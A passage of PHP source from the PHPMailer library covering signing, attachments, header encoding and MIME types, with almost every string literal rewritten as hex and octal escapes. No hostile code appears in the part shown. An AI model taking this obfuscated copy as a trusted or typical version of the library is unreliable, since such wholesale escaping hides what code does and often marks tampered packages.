phpmailerException($this->lang("\x65\170\x74\x65\x6e\163\151\157\x6e\137\x6d\x69\163\163\151\156\x67") . "\x6f\160\145\x6e\163\x73\x6c"); } $file = tempnam(sys_get_temp_dir(), "\x6d\x61\x69\x6c"); if (false === file_put_contents($file, $body)) { throw new phpmailerException($this->lang("\x73\x69\x67\x6e\x69\x6e\x67") . "\x20\x43\157\x75\154\144\x20\156\x6f\x74\x20\167\162\151\x74\145\x20\x74\x65\x6d\160\x20\146\151\154\145"); } $signed = tempnam(sys_get_temp_dir(), "\163\151\147\156\x65\144"); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\146\x69\154\145\x3a\x2f\57" . realpath($this->sign_cert_file), array("\146\151\x6c\145\72\x2f\57" . realpath($this->sign_key_file), $this->sign_key_pass), null); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\154\145\72\x2f\57" . realpath($this->sign_cert_file), array("\146\151\154\145\x3a\x2f\57" . realpath($this->sign_key_file), $this->sign_key_pass), null, PKCS7_DETACHED, $this->sign_extracerts_file); } if ($sign) { @unlink($file); $body = file_get_contents($signed); @unlink($signed); $parts = explode("\xa\12", $body, 2); $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE; $body = $parts[1]; } else { @unlink($file); @unlink($signed); throw new phpmailerException($this->lang("\163\151\147\x6e\x69\156\x67") . openssl_error_string()); } } catch (phpmailerException $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ($charSet == '') { $charSet = $this->CharSet; } if ($contentType == '') { $contentType = $this->ContentType; } if ($encoding == '') { $encoding = $this->Encoding; } $result .= $this->textLine("\x2d\x2d" . $boundary); $result .= sprintf("\103\157\156\x74\145\156\x74\55\124\x79\x70\145\x3a\x20\45\x73\x3b\40\143\150\141\x72\x73\x65\x74\75\x25\x73", $contentType, $charSet); $result .= $this->LE; if ($encoding != "\x37\142\x69\x74") { $result .= $this->headerLine("\x43\x6f\x6e\164\145\156\x74\x2d\x54\x72\x61\x6e\163\x66\145\162\55\x45\156\x63\x6f\x64\151\156\x67", $encoding); } $result .= $this->LE; return $result; } protected function endBoundary($boundary) { return $this->LE . "\55\55" . $boundary . "\x2d\x2d" . $this->LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\x61\154\164"; } if ($this->inlineImageExists()) { $type[] = "\x69\156\154\x69\x6e\x65"; } if ($this->attachmentExists()) { $type[] = "\141\164\x74\141\x63\150"; } $this->message_type = implode("\137", $type); if ($this->message_type == '') { $this->message_type = "\x70\x6c\141\x69\156"; } } public function headerLine($name, $value) { return $name . "\72\40" . $value . $this->LE; } public function textLine($value) { return $value . $this->LE; } public function addAttachment($path, $name = '', $encoding = "\142\141\163\x65\x36\x34", $type = '', $disposition = "\141\x74\164\x61\x63\150\155\145\156\164") { try { if (!self::isPermittedPath($path) or !@is_file($path)) { throw new phpmailerException($this->lang("\x66\151\x6c\x65\x5f\x61\x63\143\145\163\x73") . $path, self::STOP_CONTINUE); } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => 0); } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] == $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = md5(serialize($attachment)); if (in_array($inclhash, $incl)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ($disposition == "\151\x6e\x6c\x69\156\x65" && array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\x2d\x2d\x25\163\x25\163", $boundary, $this->LE); if (!empty($name)) { $mime[] = sprintf("\x43\x6f\156\164\145\x6e\164\55\x54\x79\160\145\x3a\x20\45\x73\73\40\156\x61\x6d\145\75\42\x25\163\x22\x25\x73", $type, $this->encodeHeader($this->secureHeader($name)), $this->LE); } else { $mime[] = sprintf("\x43\157\x6e\164\145\x6e\x74\x2d\124\x79\160\x65\x3a\40\45\x73\x25\x73", $type, $this->LE); } if ($encoding != "\67\x62\151\x74") { $mime[] = sprintf("\103\x6f\x6e\164\145\x6e\x74\55\124\162\141\156\163\x66\145\162\55\105\x6e\143\x6f\144\151\156\x67\x3a\40\45\x73\45\163", $encoding, $this->LE); } if ($disposition == "\151\x6e\x6c\151\x6e\145") { $mime[] = sprintf("\103\x6f\x6e\164\x65\x6e\164\x2d\111\104\72\40\x3c\x25\163\76\45\x73", $cid, $this->LE); } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (preg_match("\57\x5b\x20\134\50\134\x29\74\x3e\x40\x2c\x3b\72\x5c\42\134\x2f\x5c\x5b\134\135\x5c\77\75\135\57", $encoded_name)) { $mime[] = sprintf("\x43\x6f\x6e\164\x65\x6e\x74\55\x44\151\163\160\x6f\163\x69\x74\x69\157\156\72\40\45\x73\x3b\40\x66\151\154\x65\156\x61\155\x65\75\42\x25\x73\42\45\163", $disposition, $encoded_name, $this->LE . $this->LE); } else { if (!empty($encoded_name)) { $mime[] = sprintf("\103\x6f\156\164\145\156\x74\x2d\x44\151\163\x70\157\163\x69\x74\151\x6f\x6e\x3a\x20\45\163\73\40\146\x69\x6c\145\x6e\x61\155\145\x3d\45\163\x25\x73", $disposition, $encoded_name, $this->LE . $this->LE); } else { $mime[] = sprintf("\103\157\156\164\x65\156\164\55\x44\151\163\x70\157\163\151\x74\x69\157\x6e\72\x20\45\x73\x25\163", $disposition, $this->LE . $this->LE); } } } else { $mime[] = $this->LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } else { $mime[] = $this->encodeFile($path, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } } } $mime[] = sprintf("\x2d\55\45\163\55\x2d\x25\163", $boundary, $this->LE); return implode('', $mime); } protected function encodeFile($path, $encoding = "\142\x61\x73\x65\66\x34") { try { if (!self::isPermittedPath($path) or !file_exists($path)) { throw new phpmailerException($this->lang("\146\151\154\x65\x5f\x6f\x70\x65\x6e") . $path, self::STOP_CONTINUE); } $magic_quotes = false; if (version_compare(PHP_VERSION, "\67\56\64\x2e\x30", "\74")) { $magic_quotes = get_magic_quotes_runtime(); } if ($magic_quotes) { if (version_compare(PHP_VERSION, "\x35\56\63\56\60", "\74")) { set_magic_quotes_runtime(false); } else { ini_set("\155\141\x67\x69\143\x5f\x71\165\157\164\x65\x73\137\162\165\156\x74\151\x6d\x65", false); } } $file_buffer = file_get_contents($path); $file_buffer = $this->encodeString($file_buffer, $encoding); if ($magic_quotes) { if (version_compare(PHP_VERSION, "\x35\x2e\63\x2e\60", "\74")) { set_magic_quotes_runtime($magic_quotes); } else { ini_set("\155\141\147\x69\143\x5f\161\x75\x6f\164\145\x73\x5f\162\x75\x6e\x74\151\155\x65", $magic_quotes); } } return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); return ''; } } public function encodeString($str, $encoding = "\x62\x61\x73\145\66\x34") { $encoded = ''; switch (strtolower($encoding)) { case "\142\x61\163\x65\66\x34": $encoded = chunk_split(base64_encode($str), 76, $this->LE); break; case "\67\142\151\x74": case "\x38\142\151\x74": $encoded = $this->fixEOL($str); if (substr($encoded, -strlen($this->LE)) != $this->LE) { $encoded .= $this->LE; } break; case "\x62\151\156\x61\162\171": $encoded = $str; break; case "\161\x75\157\x74\145\144\55\x70\162\x69\x6e\x74\x61\142\154\145": $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\x65\156\x63\x6f\144\151\156\x67") . $encoding); break; } return $encoded; } public function encodeHeader($str, $position = "\164\145\170\x74") { $matchcount = 0; switch (strtolower($position)) { case "\160\x68\162\x61\163\145": if (!preg_match("\x2f\133\x5c\x32\60\60\55\x5c\x33\x37\x37\x5d\x2f", $str)) { $encoded = addcslashes($str, "\x0\x2e\x2e\37\177\134\42"); if ($str == $encoded && !preg_match("\x2f\x5b\x5e\101\55\x5a\141\x2d\x7a\60\x2d\x39\x21\x23\x24\45\x26\47\x2a\53\x5c\x2f\75\x3f\136\x5f\140\173\x7c\175\176\x20\55\x5d\x2f", $str)) { return $encoded; } else { return "\x22{$encoded}\x22"; } } $matchcount = preg_match_all("\x2f\x5b\x5e\134\60\x34\x30\134\x30\x34\x31\x5c\x30\x34\x33\55\x5c\61\63\63\x5c\x31\63\x35\x2d\134\x31\x37\x36\x5d\x2f", $str, $matches); break; case "\x63\x6f\155\155\145\156\164": $matchcount = preg_match_all("\57\x5b\x28\51\x22\x5d\x2f", $str, $matches); case "\164\145\170\x74": default: $matchcount += preg_match_all("\57\x5b\134\60\60\60\x2d\x5c\60\x31\x30\134\60\x31\63\x5c\60\61\x34\134\x30\61\x36\x2d\134\60\x33\67\x5c\x31\67\x37\55\x5c\63\x37\67\x5d\x2f", $str, $matches); break; } if ($matchcount == 0) { return $str; } $maxlen = 75 - 7 - strlen($this->CharSet); if ($matchcount > strlen($str) / 3) { $encoding = "\102"; if (function_exists("\x6d\x62\x5f\x73\164\162\154\145\156") && $this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\xa"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\12")); } } else { $encoding = "\x51"; $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\x3d" . self::CRLF, "\12", trim($encoded)); } $encoded = preg_replace("\57\x5e\x28\x2e\52\x29\44\57\155", "\40\75\77" . $this->CharSet . "\x3f{$encoding}\77\134\61\77\75", $encoded); $encoded = trim(str_replace("\12", $this->LE, $encoded)); return $encoded; } public function hasMultiBytes($str) { if (function_exists("\155\x62\137\163\164\162\x6c\145\156")) { return strlen($str) > mb_strlen($str, $this->CharSet); } else { return false; } } public function has8bitChars($text) { return (bool) preg_match("\57\133\x5c\x78\x38\x30\55\134\x78\106\106\x5d\57", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\x3d\77" . $this->CharSet . "\77\x42\77"; $end = "\x3f\x3d"; $encoded = ''; if ($linebreak === null) { $linebreak = $this->LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); $lookBack++; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } $encoded = substr($encoded, 0, -strlen($linebreak)); return $encoded; } public function encodeQP($string, $line_max = 76) { if (function_exists("\x71\x75\x6f\x74\145\144\137\160\162\151\156\x74\x61\x62\x6c\145\137\x65\156\x63\157\x64\x65")) { return quoted_printable_encode($string); } $string = str_replace(array("\45\x32\60", "\x25\60\104\45\60\x41\56", "\45\x30\104\45\x30\101", "\x25"), array("\x20", "\xd\xa\75\62\x45", "\15\12", "\75"), rawurlencode($string)); return preg_replace("\x2f\x5b\x5e\x5c\x72\134\156\135\x7b" . ($line_max - 3) . "\x7d\x5b\136\75\134\162\x5c\x6e\x5d\173\x32\x7d\x2f", "\44\x30\75\15\12", $string); } public function encodeQPphp($string, $line_max = 76, $space_conv = false) { return $this->encodeQP($string, $line_max); } public function encodeQ($str, $position = "\164\x65\170\x74") { $pattern = ''; $encoded = str_replace(array("\15", "\xa"), '', $str); switch (strtolower($position)) { case "\160\x68\x72\x61\163\145": $pattern = "\x5e\101\55\132\141\55\172\x30\x2d\x39\41\x2a\x2b\x5c\57\x20\55"; break; case "\x63\157\155\x6d\x65\x6e\x74": $pattern = "\x5c\x28\134\x29\42"; case "\x74\145\170\x74": default: $pattern = "\134\x30\x30\60\55\x5c\x30\x31\61\134\60\x31\63\x5c\x30\x31\x34\x5c\60\61\66\x2d\x5c\60\63\67\x5c\60\x37\65\134\x30\67\67\134\x31\x33\x37\x5c\61\x37\x37\55\x5c\63\x37\67" . $pattern; break; } $matches = array(); if (preg_match_all("\57\x5b{$pattern}\x5d\x2f", $encoded, $matches)) { $eqkey = array_search("\x3d", $matches[0]); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\75"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\75" . sprintf("\x25\x30\62\x58", ord($char)), $encoded); } } return str_replace("\x20", "\137", $encoded); } public function addStringAttachment($string, $filename, $encoding = "\142\141\163\x65\x36\x34", $type = '', $disposition = "\141\164\164\x61\143\x68\x6d\145\x6e\x74") { if ($type == '') { $type = self::filenameToType($filename); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } public function addEmbeddedImage($path, $cid, $name = '', $encoding = "\142\x61\163\145\66\x34", $type = '', $disposition = "\151\x6e\x6c\151\x6e\x65") { if (!self::isPermittedPath($path) or !@is_file($path)) { $this->setError($this->lang("\x66\x69\154\x65\137\141\143\x63\x65\x73\x73") . $path); return false; } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = "\x62\x61\163\x65\66\64", $type = '', $disposition = "\151\156\154\x69\156\x65") { if ($type == '' and !empty($name)) { $type = self::filenameToType($name); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); return true; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\x69\x6e\154\151\156\x65") { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\141\x74\x74\141\x63\150\155\145\x6e\164") { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $RecipientsQueue = $this->RecipientsQueue; foreach ($RecipientsQueue as $address => $params) { if ($params[0] == $kind) { unset($this->RecipientsQueue[$address]); } } } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\164\157"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\143\x63"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\x62\x63\x63"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($msg) { $this->error_count++; if ($this->Mailer == "\163\x6d\164\x70" and !is_null($this->smtp)) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\x65\162\162\x6f\162"])) { $msg .= $this->lang("\163\x6d\164\160\x5f\145\x72\162\x6f\x72") . $lasterror["\x65\x72\162\157\x72"]; if (!empty($lasterror["\144\x65\164\x61\151\154"])) { $msg .= "\x20\x44\x65\164\x61\x69\x6c\x3a\x20" . $lasterror["\144\x65\164\x61\x69\x6c"]; } if (!empty($lasterror["\163\155\x74\160\x5f\x63\x6f\144\x65"])) { $msg .= "\40\123\x4d\124\x50\40\x63\157\144\x65\x3a\40" . $lasterror["\163\x6d\x74\160\137\143\157\x64\145"]; } if (!empty($lasterror["\163\x6d\x74\x70\137\x63\157\144\x65\137\145\x78"])) { $msg .= "\40\101\x64\144\x69\x74\151\157\x6e\x61\x6c\x20\123\115\x54\120\40\151\x6e\x66\157\72\x20" . $lasterror["\x73\155\x74\x70\x5f\143\x6f\x64\145\x5f\145\x78"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\104\54\40\152\x20\x4d\x20\131\40\x48\72\x69\72\x73\x20\117"); } protected function serverHostname() { $result = "\x6c\157\143\x61\x6c\150\x6f\163\164\x2e\x6c\x6f\x63\141\x6c\144\157\155\x61\151\x6e"; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) and array_key_exists("\123\x45\122\126\x45\122\137\116\101\x4d\x45", $_SERVER) and !empty($_SERVER["\x53\105\x52\x56\x45\122\137\116\x41\115\x45"])) { $result = $_SERVER["\123\x45\x52\x56\x45\x52\x5f\x4e\101\115\105"]; } elseif (function_exists("\x67\x65\164\x68\157\163\x74\x6e\x61\155\145") && gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\x6e") !== false) { $result = php_uname("\156"); } return $result; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage("\145\x6e"); } if (array_key_exists($key, $this->language)) { if ($key == "\x73\x6d\164\x70\x5f\x63\x6f\156\x6e\145\143\x74\137\146\141\151\x6c\x65\144") { return $this->language[$key] . "\x20\150\164\164\x70\163\x3a\x2f\57\x67\151\x74\x68\165\x62\56\x63\x6f\x6d\x2f\x50\x48\120\115\141\x69\154\145\162\57\x50\x48\120\115\x61\151\154\x65\x72\57\x77\x69\153\x69\57\124\162\x6f\x75\142\x6c\x65\x73\150\x6f\x6f\164\151\156\147"; } return $this->language[$key]; } else { return $key; } } public function isError() { return $this->error_count > 0; } public function fixEOL($str) { $nstr = str_replace(array("\xd\12", "\15"), "\12", $str); if ($this->LE !== "\12") { $nstr = str_replace("\12", $this->LE, $nstr); } return $nstr; } public function addCustomHeader($name, $value = null) { if ($value === null) { $this->CustomHeader[] = explode("\72", $name, 2); } else { $this->CustomHeader[] = array($name, $value); } } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\57\x28\163\162\143\x7c\x62\x61\x63\153\x67\162\157\165\x6e\x64\x29\x3d\x5b\42\x27\x5d\x28\56\52\51\133\42\47\x5d\x2f\125\x69", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && substr($basedir, -1) != "\x2f") { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { if (preg_match("\43\136\144\141\164\141\72\50\151\155\141\x67\x65\x5b\x5e\73\x2c\135\x2a\51\50\x3b\x62\141\x73\x65\x36\64\51\x3f\54\43", $url, $match)) { $data = substr($url, strpos($url, "\54")); if ($match[2]) { $data = base64_decode($data); } else { $data = rawurldecode($data); } $cid = md5($url) . "\100\x70\x68\x70\x6d\x61\151\154\145\x72\x2e\x30"; if ($this->addStringEmbeddedImage($data, $cid, "\145\155\x62\145\x64" . $imgindex, "\x62\x61\163\x65\x36\x34", $match[1])) { $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\75\42\x63\151\144\72" . $cid . "\42", $message); } continue; } if (!empty($basedir) && strpos($url, "\56\x2e") === false && substr($url, 0, 4) !== "\143\x69\144\x3a" && !preg_match("\43\136\x5b\141\55\x7a\135\x5b\141\x2d\x7a\60\x2d\71\x2b\x2e\55\x5d\x2a\x3a\x3f\57\x2f\x23\151", $url)) { $filename = basename($url); $directory = dirname($url); if ($directory == "\56") { $directory = ''; } $cid = md5($url) . "\100\x70\150\x70\155\x61\x69\154\x65\x72\56\60"; if (strlen($directory) > 1 && substr($directory, -1) != "\x2f") { $directory .= "\57"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, "\142\x61\x73\145\x36\64", self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\57" . $images[1][$imgindex] . "\75\133\x22\x27\x5d" . preg_quote($url, "\57") . "\x5b\x22\47\x5d\x2f\x55\151", $images[1][$imgindex] . "\75\x22\x63\x69\144\x3a" . $cid . "\42", $message); } } } } $this->isHTML(true); $this->Body = $this->normalizeBreaks($message); $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\x54\x6f\x20\166\x69\x65\167\x20\x74\150\x69\x73\40\x65\155\x61\151\x6c\40\155\x65\163\163\x61\147\x65\x2c\40\157\160\x65\156\40\x69\x74\40\151\x6e\40\x61\x20\x70\x72\157\x67\162\141\155\40\x74\150\141\164\40\x75\156\x64\x65\x72\163\x74\x61\x6e\144\163\x20\x48\124\115\114\x21" . self::CRLF . self::CRLF; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\57\74\50\x68\145\141\144\x7c\x74\x69\x74\x6c\x65\174\163\x74\x79\x6c\x65\x7c\163\x63\162\x69\160\164\x29\133\136\76\135\x2a\x3e\x2e\x2a\77\74\x5c\x2f\x5c\61\76\x2f\163\x69", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\x78\154" => "\x61\x70\x70\154\151\143\x61\164\151\157\156\x2f\145\170\x63\145\x6c", "\152\x73" => "\x61\160\x70\x6c\x69\x63\141\x74\x69\x6f\156\57\x6a\x61\x76\141\x73\143\162\151\x70\164", "\150\161\x78" => "\x61\160\x70\154\x69\x63\x61\164\151\x6f\x6e\57\155\x61\143\x2d\x62\151\x6e\x68\x65\x78\x34\x30", "\x63\160\164" => "\x61\160\160\x6c\151\143\141\164\x69\157\156\57\x6d\141\x63\x2d\143\x6f\155\x70\141\x63\164\x70\x72\x6f", "\x62\x69\156" => "\x61\160\x70\154\x69\x63\x61\x74\151\x6f\156\57\155\x61\143\x62\x69\x6e\141\x72\x79", "\144\x6f\x63" => "\x61\160\160\x6c\151\143\141\x74\151\157\x6e\57\x6d\x73\x77\x6f\162\144", "\x77\157\x72\144" => "\x61\x70\x70\x6c\151\143\x61\x74\x69\x6f\x6e\57\x6d\x73\167\157\162\144", "\170\154\163\x78" => "\141\160\160\154\x69\143\x61\x74\x69\157\x6e\57\166\x6e\x64\x2e\x6f\x70\145\156\170\x6d\x6c\x66\157\x72\x6d\x61\164\x73\x2d\157\146\x66\151\143\x65\144\157\x63\x75\155\145\156\164\56\163\160\x72\145\141\x64\163\x68\x65\x65\x74\155\154\56\x73\x68\145\x65\164", "\170\x6c\164\170" => "\141\x70\x70\x6c\x69\143\x61\x74\x69\x6f\x6e\57\x76\156\x64\x2e\157\x70\x65\156\x78\x6d\154\x66\157\162\x6d\141\164\163\55\157\146\146\x69\143\145\x64\157\x63\x75\155\x65\x6e\x74\56\x73\x70\x72\145\x61\x64\x73\x68\145\145\x74\155\154\x2e\164\145\x6d\x70\154\x61\x74\x65", "\x70\x6f\x74\170" => "\141\x70\160\x6c\x69\x63\141\x74\151\x6f\156\x2f\166\x6e\144\56\x6f\160\x65\156\x78\155\x6c\146\x6f\162\155\x61\x74\x73\x2d\157\x66\146\x69\143\145\144\x6f\x63\165\x6d\x65\156\x74\56\x70\162\x65\163\145\156\164\141\164\151\157\156\155\x6c\56\x74\x65\x6d\x70\154\x61\x74\145", "\x70\x70\x73\x78" => "\x61\160\x70\x6c\x69\x63\x61\164\151\x6f\x6e\57\166\156\x64\x2e\157\160\x65\156\170\155\x6c\146\x6f\x72\155\141\x74\163\55\157\x66\146\x69\x63\x65\x64\157\x63\x75\155\145\156\164\x2e\x70\162\x65\163\x65\x6e\x74\141\x74\x69\157\x6e\x6d\154\x2e\163\154\x69\144\145\163\x68\157\x77", "\x70\160\x74\170" => "\x61\160\x70\154\151\x63\141\164\x69\x6f\x6e\x2f\x76\156\144\x2e\157\160\x65\x6e\170\x6d\154\x66\x6f\x72\x6d\x61\164\x73\x2d\x6f\146\146\x69\143\145\x64\x6f\x63\x75\155\145\156\x74\56\x70\x72\145\163\145\156\164\x61\164\x69\x6f\156\x6d\154\56\x70\162\x65\x73\x65\x6e\164\x61\164\151\157\156", "\163\154\x64\x78" => "\141\160\x70\x6c\x69\x63\141\x74\151\157\156\x2f\x76\156\144\x2e\x6f\x70\x65\x6e\170\x6d\154\x66\157\162\x6d\141\x74\163\x2d\157\146\146\x69\143\x65\144\x6f\x63\165\x6d\145\156\164\56\x70\x72\145\163\145\156\x74\x61\164\151\x6f\156\x6d\154\56\x73\x6c\151\x64\x65", "\x64\157\143\170" => "\x61\x70\x70\x6c\x69\x63\x61\164\151\157\x6e\57\166\156\144\x2e\x6f\160\145\x6e\170\x6d\154\x66\157\x72\x6d\141\x74\x73\55\x6f\x66\146\151\143\x65\144\x6f\143\165\x6d\x65\156\164\56\167\157\x72\x64\160\162\x6f\143\x65\163\163\x69\x6e\x67\155\x6c\x2e\144\x6f\x63\x75\155\145\156\x74", "\144\x6f\x74\x78" => "\141\160\160\x6c\x69\143\x61\x74\x69\157\156\x2f\x76\x6e\144\56\157\x70\x65\x6e\170\x6d\154\x66\157\162\155\141\x74\163\x2d\157\x66\146\151\x63\x65\x64\157\x63\165\155\145\x6e\x74\x2e\167\x6f\162\x64\160\x72\157\x63\x65\x73\163\x69\x6e\147\x6d\x6c\x2e\x74\x65\155\160\x6c\141\x74\145", "\x78\x6c\x61\155" => "\x61\x70\x70\x6c\x69\143\141\x74\x69\157\156\x2f\166\156\x64\x2e\155\x73\x2d\x65\170\143\x65\154\56\141\144\x64\151\156\x2e\x6d\x61\x63\162\x6f\105\x6e\141\142\154\145\x64\56\61\x32", "\x78\x6c\163\x62" => "\x61\160\160\x6c\151\143\141\x74\151\157\x6e\x2f\166\156\x64\56\x6d\163\x2d\145\x78\x63\x65\154\x2e\163\x68\x65\145\164\56\142\x69\x6e\x61\x72\171\56\155\x61\143\x72\157\105\156\141\x62\x6c\x65\144\x2e\61\x32", "\143\154\141\163\x73" => "\x61\x70\x70\154\x69\x63\141\x74\151\157\x6e\57\x6f\x63\x74\145\164\55\163\x74\x72\145\x61\155", "\144\154\x6c" => "\x61\x70\x70\x6c\x69\x63\141\164\151\x6f\x6e\x2f\157\143\x74\x65\164\55\x73\164\162\x65\141\155", "\x64\x6d\x73" => "\141\160\x70\154\151\143\141\164\x69\157\156\x2f\157\143\x74\x65\164\55\163\x74\x72\x65\x61\x6d", "\x65\x78\145" => "\x61\x70\160\x6c\151\x63\141\x74\151\x6f\x6e\57\157\143\x74\x65\x74\x2d\163\164\x72\x65\141\155", "\x6c\150\141" => "\x61\160\160\x6c\151\143\141\x74\151\x6f\156\57\157\143\x74\x65\x74\55\163\164\x72\145\x61\155", "\154\172\x68" => "\141\160\160\154\151\x63\141\x74\x69\157\156\57\x6f\x63\x74\x65\x74\55\x73\x74\162\x65\x61\155", "\x70\163\x64" => "\141\160\x70\x6c\151\x63\x61\164\x69\157\156\57\157\x63\164\x65\x74\55\163\x74\x72\145\141\155", "\163\x65\141" => "\141\160\160\154\x69\x63\141\164\151\x6f\156\x2f\157\143\164\x65\164\55\163\x74\x72\145\141\155", "\x73\157" => "\x61\160\x70\x6c\x69\143\141\x74\151\x6f\156\x2f\x6f\x63\164\145\164\55\163\164\x72\145\141\x6d", "\x6f\x64\x61" => "\x61\160\x70\154\151\x63\141\x74\151\x6f\156\x2f\157\144\x61", "\160\x64\146" => "\141\x70\x70\154\x69\143\x61\164\x69\x6f\156\57\160\x64\x66", "\x61\151" => "\x61\x70\x70\154\x69\x63\x61\x74\x69\x6f\x6e\x2f\x70\x6f\x73\164\163\x63\x72\x69\x70\x74", "\x65\x70\163" => "\141\160\160\x6c\151\143\141\x74\151\x6f\x6e\57\160\157\163\164\163\x63\162\151\x70\164", "\x70\163" => "\x61\x70\160\x6c\x69\143\141\164\x69\x6f\x6e\x2f\160\157\x73\x74\x73\x63\x72\x69\160\164", "\163\x6d\151" => "\x61\160\x70\x6c\x69\143\141\x74\x69\157\x6e\57\x73\155\x69\x6c", "\x73\x6d\151\154" => "\141\160\160\154\151\x63\x61\x74\151\157\156\57\163\x6d\151\154", "\x6d\151\146" => "\141\160\160\154\151\143\x61\x74\151\157\x6e\x2f\166\x6e\x64\56\155\x69\x66", "\x78\x6c\x73" => "\141\x70\160\x6c\151\143\x61\x74\x69\157\x6e\57\166\156\144\x2e\155\163\x2d\x65\x78\x63\x65\154", "\160\160\164" => "\x61\160\x70\x6c\x69\143\141\x74\x69\x6f\x6e\57\x76\156\x64\56\x6d\163\x2d\x70\x6f\x77\145\x72\x70\x6f\x69\x6e\164", "\167\142\170\x6d\154" => "\141\x70\160\x6c\x69\143\x61\164\151\157\x6e\x2f\x76\156\144\x2e\x77\x61\x70\x2e\x77\x62\x78\x6d\x6c", "\x77\155\x6c\143" => "\141\160\160\154\151\x63\141\x74\x69\x6f\x6e\x2f\x76\156\x64\x2e\167\141\x70\56\x77\155\154\x63", "\x64\x63\x72" => "\141\x70\x70\154\x69\x63\141\x74\151\x6f\156\x2f\170\55\x64\x69\x72\145\143\164\x6f\x72", "\144\151\162" => "\x61\160\x70\x6c\x69\x63\x61\164\151\x6f\x6e\57\170\x2d\144\x69\162\x65\x63\164\x6f\162", "\x64\x78\x72" => 